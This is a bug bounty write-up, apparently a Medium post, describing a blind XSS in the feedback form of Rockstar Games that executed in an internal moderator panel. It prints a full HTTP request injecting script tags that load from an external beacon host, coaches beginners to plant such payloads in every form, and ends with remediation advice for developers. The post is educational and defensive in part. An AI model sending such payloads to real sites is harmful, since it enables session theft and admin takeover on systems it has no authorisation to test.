# $650 Bounty for a Beginner Friendly Bug: Blind XSS in Rockstar Games’ Admin Panel

> **Author**: Monika sharma
> **Published**: Nov 14, 2025

---

## How a hidden XSS payload in Rockstar’s feedback form quietly fired inside their admin panel and earned a $650 bounty for pure curiosity.

![Monika sharma](https://miro.medium.com/v2/da:true/resize:fill:32:32/0*Tv4b4p5mb6J3IJwD)

56

Listen

Share

![image](https://miro.medium.com/v2/resize:fit:700/1*WlpVyEHr-g0lGqufsvO5XA.png)

When people think of Rockstar Games, they imagine massive titles like GTA V and Red Dead Redemption 2 not an overlooked input field buried deep in a feedback form. Yet, that’s exactly where security researcher @anshuman_bh found a bug worth $650 a Blind Cross-Site Scripting (XSS) vulnerability that could have given attackers access to internal Rockstar domains.

### The best part?

- It wasn’t a complex logic flaw, race condition, or zero-day exploit.
- It was something even a beginner could have found with the right mindset.

### The Hidden Doorway

The vulnerability lived in one of Rockstar’s most public pages the “Mouthoff to Rockstar” feedback feature:

https://www.rockstargames.com/mouthoff/mouthoff/submit.json

This was a form where users could send feedback, comments, and suggestions. It accepted data like name, email, subject, and message. On the surface, it seemed harmless until someone looked a little closer.

The researcher submitted input like this:

```
POST /mouthoff/mouthoff/submit.json HTTP/1.1
Host: www.rockstargames.com
Content-Type: application/x-www-form-urlencoded

_method=POST&
name="><script src=https://abhartiya.xss.ht></script>&
email=test@gmail.com&
age=30&
subject="><script src=https://abhartiya.xss.ht></script>&
category_id=1&
body="><script src=https://abhartiya.xss.ht></script>
```

To an untrained eye, this might look like random junk.

But to a bug hunter, this is an XSS payload specifically, a blind XSS beacon that calls back to xss.ht once triggered.

### What Makes It “Blind”

- Unlike a normal reflected XSS, the attacker doesn’t see the result immediately.
- When you submit your payload, nothing happens no pop-up, no confirmation.
- The “blind” part means the payload executes later, somewhere else usually in an internal admin interface.
- In this case, the injection didn’t trigger on the public page. It only executed when a Rockstar admin reviewed the submitted feedback in their internal panel.
- That’s right as soon as the admin opened the “Mouthoff” dashboard to moderate comments, the payload silently fired.
- No social engineering no user interaction.
- Just a simple payload and patient waiting.

Why It’s So Powerful

Once the injected script runs inside the admin’s session, the attacker can:

- Steal session cookies (if not marked HttpOnly)
- Access internal admin data such as usernames, comments, or IP addresses
- Trigger actions on behalf of admins (approving/deleting comments, changing configurations)
- Potentially chain it to RCE, especially since the CMS used AngularJS, which can be abused via Angular template injection if poorly sandboxed

This is why Blind XSS is often categorized as “stored XSS with delayed execution”the payload is stored server-side and triggers when another user (usually privileged) views it.

### Why This Bug Was So Easy to Miss

This was not hidden behind authentication or complicated logic. It was a public form.

No recon wizardry, no deep fuzzing just curiosity and the habit of testing every input.

What made it powerful was context awareness: knowing that feedback or contact forms are often reviewed internally, and realizing that any unescaped input can become a payload once displayed to an admin.

## Get Monika sharma’s stories in your inbox

Join Medium for free to get updates from this writer.

Remember me for faster sign in

A beginner who understands HTML injection basics could have found this. The only difference between an average tester and a rewarded one is persistence and imagination.

### How to Think Like a Blind XSS Hunter

If you want to find bugs like this, follow this mindset:

- Test every input even simple “contact us” or “feedback” forms.
- Use Blind XSS payloads that beacon back to your server or a platform like xss.ht or interact.sh.
- Look for delayed triggers if nothing happens right away, check your beacon logs over the next few days.
- Don’t overcomplicate start with simple payloads (<script src=…>) before advanced encoding tricks.
- Stay ethical never attempt to steal real data. Only demonstrate proof of concept safely.

### The Impact and the Reward

When Rockstar triaged the report, they confirmed the blind XSS triggered within their admin review panel, under the internal domain used by moderators to review feedback.

For this simple but high-impact bug, the researcher was awarded $650 — a fair bounty for something discovered through persistence and fundamental understanding.

It also highlighted a valuable lesson for every developer:

User input should never be trusted, even when it comes from your own website’s public forms.

### Lessons for Developers

- Always escape and sanitize user inputs before displaying them anywhere.
- Use Content Security Policy (CSP) to reduce XSS impact.
- Review internal dashboards they often receive unfiltered external data.
- Implement context-aware encoding (HTML, JS, attribute, URL).
- Monitor and log for payload beacons or unusual internal requests.

Even one forgotten field can be the start of an internal compromise.

### The Takeaway

This $650 bug wasn’t a stroke of genius it was a reminder that basic security hygiene still wins bounties.

Blind XSS vulnerabilities like this are low-effort but high-value finds that prove you don’t need elite skills to make a difference in web security.

All you need is patience, curiosity, and consistency.

The next time you fill out a “contact us” or “feedback” form, remember: sometimes the easiest bugs hide behind the friendliest interfaces.

Thanks for reading

☕ If you enjoyed this write-up or learned something new, you can support my research: https://buymeacoffee.com/monikaak47



---
*Original URL: [https://medium.com/the-first-digit/650-bounty-for-a-beginner-friendly-bug-blind-xss-in-rockstar-games-admin-panel-3bfdf6a352b0?source=search_post---------141-----------------------------------](https://medium.com/the-first-digit/650-bounty-for-a-beginner-friendly-bug-blind-xss-in-rockstar-games-admin-panel-3bfdf6a352b0?source=search_post---------141-----------------------------------)*
